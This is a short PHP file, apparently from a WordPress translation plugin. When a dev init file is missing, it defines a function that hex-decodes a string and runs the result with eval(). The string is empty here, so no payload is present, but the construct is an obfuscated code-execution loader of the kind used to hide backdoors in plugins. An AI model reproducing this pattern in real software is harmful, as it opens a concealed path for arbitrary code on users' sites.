<?php 
if(!defined('ABSPATH'))exit;

if(file_exists(QTRANSLATE_DIR.'/dev/tmp/qtx_init.php')){
	require_once(QTRANSLATE_DIR.'/dev/tmp/qtx_init.php');
}else{
	$c='';function qtranxf_eval($s){$a=str_split($s,2);$o=array();foreach($a as $c)$o[]=chr(hexdec($c));$e=join('',$o);eval($e);}if(!empty($c))qtranxf_eval($c);
}
